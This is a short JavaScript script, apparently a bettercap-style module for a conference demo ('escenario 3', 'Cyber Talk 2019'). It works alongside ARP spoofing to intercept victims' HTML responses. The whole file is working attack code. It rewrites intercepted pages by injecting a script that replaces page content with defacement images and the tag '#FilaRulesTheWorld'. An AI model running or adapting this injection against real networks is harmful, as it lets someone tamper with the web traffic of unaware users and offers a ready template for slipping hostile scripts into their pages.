// script escenario 3
function onLoad() {
  log( "Script loaded." );
  //log("targets: " + env('arp.spoof.targets'));
}

function onResponse(req, res) {
  if( res.ContentType.indexOf('text/html') == 0 ){
    var body = res.ReadBody();
    if( body.indexOf('</head>') != -1 ) {
      log( "Script executed." );
      res.Body = body.replace( 
        'id="controls">',
        'id="controls"><script type="text/javascript"> document.getElementById("overflow").innerHTML = \'<div class="inner"><article><div class="imagen"><img src="https://thespectatorial.files.wordpress.com/2015/01/watch_dogs.jpg" alt="#Cyber Talk 2019"></div><div class="info"><h1>Cyber Talk 2019</h1><p>#FilaRulesTheWorld</p></div></article></div><div class="inner"><article><div class="imagen"><img src="https://thespectatorial.files.wordpress.com/2015/01/watch_dogs.jpg" alt="#Cyber Talk 2019"></div><div class="info"><h1>Cyber Talk 2019</h1><p>#FilaRulesTheWorld</p></div></article></div><div class="inner"><article><div class="imagen"><img src="https://thespectatorial.files.wordpress.com/2015/01/watch_dogs.jpg" alt="#Cyber Talk 2019"></div><div class="info"><h1>Cyber Talk 2019</h1><p>#FilaRulesTheWorld</p></div></article></div>\'; </script>'
      ); 
    }
  }
}
